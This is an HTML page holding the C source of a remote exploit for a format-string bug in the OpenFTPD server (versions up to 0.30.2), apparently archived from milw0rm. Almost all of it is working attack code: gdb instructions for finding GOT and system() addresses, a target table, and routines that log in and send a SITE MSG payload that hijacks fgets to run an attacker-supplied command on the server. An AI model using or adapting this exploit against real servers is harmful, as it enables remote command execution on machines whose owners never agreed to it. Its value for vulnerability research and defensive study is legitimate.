<html><head><title>OpenFTPD (<= 0.30.2) Remote Exploit</title></head><pre>/***********************************************************
* hoagie_openftpd.c
* LINUX/X86 OPENFTPD REMOTE EXLPOIT (&lt;= 0.30.2)
*
* &quot;
* Searching for those warez ftpd's out there and 
* leeching 'free' movies
* &quot;
*
* Remote Linux/OpenFTPD exploit for the format string bug
* in the message system. This vulnerability was rediscovered 
* by a VOID.AT.
*
* HOWTO get the offsets
* andi@denkmal:~$ gdb ~/openftpd/bin/msg
* ...
*
* (gdb) x/i fgets
* 0x8048ae4 &lt;fgets&gt;: jmp *0x804db90
* ^^^^^^^^^
* the first one
* (gdb) break main
* Breakpoint 1 at 0x804bd05
* (gdb) r
* Starting program: /home/andi/openftpd/bin/msg
* [Thread debugging using libthread_db enabled]
* [New Thread 16384 (LWP 29479)]
* [Switching to Thread 16384 (LWP 29479)]
*
* Breakpoint 1, 0x0804bd05 in main ()
* (gdb) x/i system
* 0x40071c40 &lt;system&gt;: push %ebp
* ^^^^^^^^^^
* the second addresss 
*
* THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-
* CONCEPT. THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY
* DAMAGE DONE USING THIS PROGRAM.
*
* VOID.AT Security
* andi@void.at
* http://www.void.at
* 
************************************************************/

#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netdb.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;

enum EXPLOITSTATE { SENDUSER, SENDPASS, DELMESSAGE, PURGEMESSAGE, SENDMESSAGE, READMESSAGE, READING };

struct target_t {
char *sys;
char *libc;
int fgetsgot;
int system;
};

struct target_t targets[] = {
{ &quot;Debian unstable&quot;, &quot;2.3.2&quot;, 0x804db90, 0x40072c40 },
{ NULL, 0, 0 }
};

int connectserver(int *s, char *host, int port) {
struct sockaddr_in s_in;
struct hostent *he;
char *ip;

if ( (*s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
fprintf(stderr,&quot;[*] can't create TCP socket\n&quot;);
return -1;
}

memset(&amp;s_in, 0, sizeof(s_in));
s_in.sin_family = AF_INET;
s_in.sin_port = htons(port);

if ( (he = gethostbyname(host)) != NULL)
memcpy(&amp;s_in.sin_addr, he-&gt;h_addr, he-&gt;h_length);
else {
if ( (s_in.sin_addr.s_addr = inet_addr(host) ) &lt; 0) {
return -3;
}
} 

if (connect(*s, (struct sockaddr *)&amp;s_in, sizeof(s_in)) == -1) {
fprintf(stderr,&quot;[*] can't connect to %s:%d\n&quot;, host, port);
return -4;
}
return 0;
}

int sendlogin(int s, char *username) {
char tmp[2048] = &quot;&quot;;

snprintf(tmp, sizeof(tmp), &quot;USER %s\n&quot;, username);
return write(s, tmp, strlen(tmp));
}

int sendpassword(int s, char *password) {
char tmp[2048] = &quot;&quot;;

snprintf(tmp, sizeof(tmp), &quot;PASS %s\n&quot;, password);
return write(s, tmp, strlen(tmp));
}

int purgemessage(int s) {
char tmp[2048] = &quot;&quot;;

snprintf(tmp, sizeof(tmp), &quot;SITE MSG PURGE\n&quot;);
return write(s, tmp, strlen(tmp));
}

int delmessage(int s) {
char tmp[2048] = &quot;&quot;;

snprintf(tmp, sizeof(tmp), &quot;SITE MSG DEL ALL\n&quot;);
return write(s, tmp, strlen(tmp));
}

int sendexploit(int s, char *username, int idx, char *exec) {
int i;
char tmp[4096], execcode[68], writecode[68];
unsigned short high, low, count1, count2;
int addr1, addr2;

high = targets[idx].system &gt;&gt; 16 &amp; 0xFFFF;
low = targets[idx].system &amp; 0xFFFF;

if (high &gt; low) {
count1 = low;
count2 = high;
addr1 = targets[idx].fgetsgot;
addr2 = targets[idx].fgetsgot + 2;
} else {
count1 = high;
count2 = low;
addr1 = targets[idx].fgetsgot + 2;
addr2 = targets[idx].fgetsgot;
}

if (exec) {
strcpy(execcode, exec);
}
if (strlen(execcode) &lt; 32) {
do {
strcat(execcode, &quot;_&quot;);
} while (strlen(execcode) &lt; 32);
}

/* calc count1:
*
* 1.) string will be stored in str =&gt; sprintf(str, &quot; !C| !0%-66s !C|!0\n&quot;, buff);
* so we have to subtract 8 bytes from count1 (=&gt; strlen(&quot;&quot; !C| !0&quot;))
* 2.) the next data will be our string for system call 
* so we have to subtract strlen(execcode) from count1
* 3.) at least we have to subtract 8 bytes for the two addresses that are 
* used for writing (%hn)
*/
count1 -= (strlen(execcode) + 16);
snprintf(writecode, sizeof(writecode), 
&quot;%c%c%c%c%c%c%c%c%%%du%%18$hn%%%du%%19$hn&quot;,
addr1 &amp; 0xFF, (addr1 &gt;&gt; 8) &amp; 0xFF, (addr1 &gt;&gt; 16) &amp; 0xFF, (addr1 &gt;&gt; 24) &amp; 0xFF,
addr2 &amp; 0xFF, (addr2 &gt;&gt; 8) &amp; 0xFF, (addr2 &gt;&gt; 16) &amp; 0xFF, (addr2 &gt;&gt; 24) &amp; 0xFF,
count1, count2 - count1 - 0x30);
snprintf(tmp, sizeof(tmp), &quot;SITE MSG SEND %s %s%s\n&quot;, username, execcode, writecode);
printf(&quot;[*] len: %d, sending code [%s]\n&quot;, strlen(execcode) + strlen(writecode), tmp);
return write(s, tmp, strlen(tmp));
}

int readmessage(int s) {
char tmp[2048] = &quot;&quot;;

snprintf(tmp, sizeof(tmp), &quot;SITE MSG READ\n&quot;);
return write(s, tmp, strlen(tmp));
}

int attack(int s, char *user, char *password, int idx, char *exec) {
fd_set fs;
int selret, state, len, code;
char buffer[2048] = &quot;&quot;;

FD_ZERO(&amp;fs);
FD_SET(s, &amp;fs);

state = SENDUSER;

do {
selret = select(s + 1, &amp;fs, NULL, NULL, NULL);
if (selret &gt; 0 &amp;&amp; FD_ISSET(s, &amp;fs)) {
memset(buffer, 0, sizeof(buffer));
len = read(s, buffer, sizeof(buffer));
printf(&quot;&lt;&lt;&lt; %s\n&quot;, buffer);
sscanf(buffer, &quot;%d&quot;, &amp;code);
switch(state) {
case SENDUSER: sendlogin(s, user);
state = SENDPASS;
break;
case SENDPASS: sendpassword(s, password);
state = DELMESSAGE;
break;
case DELMESSAGE: delmessage(s);
state = PURGEMESSAGE;
break;
case PURGEMESSAGE: purgemessage(s);
state = SENDMESSAGE;
break;
case SENDMESSAGE: if (code &gt; 500) {
fprintf(stderr, &quot;[*] login failed\n&quot;);
len = -1;
} else if (code == 230) {
fprintf(stderr, &quot;[*] sending exploit code ...\n&quot;);
sendexploit(s, user, idx, exec);
state = READMESSAGE;
}
break;
case READMESSAGE: sleep(5);
readmessage(s);
state = READING;
break; 
case READING: if (code == 200 &amp;&amp; strstr(buffer, &quot;00000&quot;) &amp;&amp; strstr(buffer, exec)) {
printf(&quot;[*] done\n&quot;);
}
break;
}
}
} while (len &gt; 0);
}

void helpme(int argc, char **argv) {
int i;

printf(&quot;hoagie_openftpd - openftpd &lt; 0.30.2 x86/linux remote\n&quot;);
printf(&quot;-andi / void.at\n\n&quot;);
printf(&quot;usage: %s -h hostname:port -u username -p password -t target -e command\n&quot;, argv[0]);
printf(&quot;\n\nexample:\n&quot;);
printf(&quot;%s -u localhost:21 -u anonymous -t 0 -e \&quot;id &gt; /tmp/0wned\&quot;\n&quot;);
printf(&quot;\ntargets:\n&quot;);
for (i = 0; targets[i].sys != NULL; i++) {
printf(&quot;%d %s (libc: %s): 0x%0x 0x%0x\n&quot;, i, targets[i].sys, targets[i].libc, targets[i].fgetsgot, targets[i].system);
}
}

int main(int argc, char **argv) {
char optchar, *exec = NULL, server[512] = &quot;&quot;, *username = NULL, *password = NULL;
int s, retval = -1, port, target = 0;

if (argc &lt; 2) {
helpme(argc, argv);
} else {
while ( (optchar = getopt(argc, argv, &quot;h:t:u:p:e:&quot;)) != EOF ) {
switch(optchar) {
case 'h': sscanf(optarg, &quot;%[^:]:%d&quot;, server, &amp;port);
break;
case 'u': username = optarg;
break;
case 'p': password = optarg;
break;
case 't': target = atoi(optarg);
break;
case 'e': exec = optarg;
break;
}
}

if (!strcmp(server, &quot;&quot;)) {
strcpy(server, &quot;127.0.0.1&quot;);
port = 21;
}

if (!username) {
username = &quot;anonymous&quot;;
}

if (!password) {
password = &quot;freak@kaefig.com&quot;;
}

if (!exec) {
exec = &quot;id; killall msg; &quot;;
}

fprintf(stderr, &quot;[*] connecting %s:%d (%s/%s)...\n&quot;, server, port, username, password);
if (!connectserver(&amp;s, server, port)) {
retval = attack(s, username, password, target, exec);
close(s);
}
}

return retval;
}

// milw0rm.com [2004-08-03]</pre></html>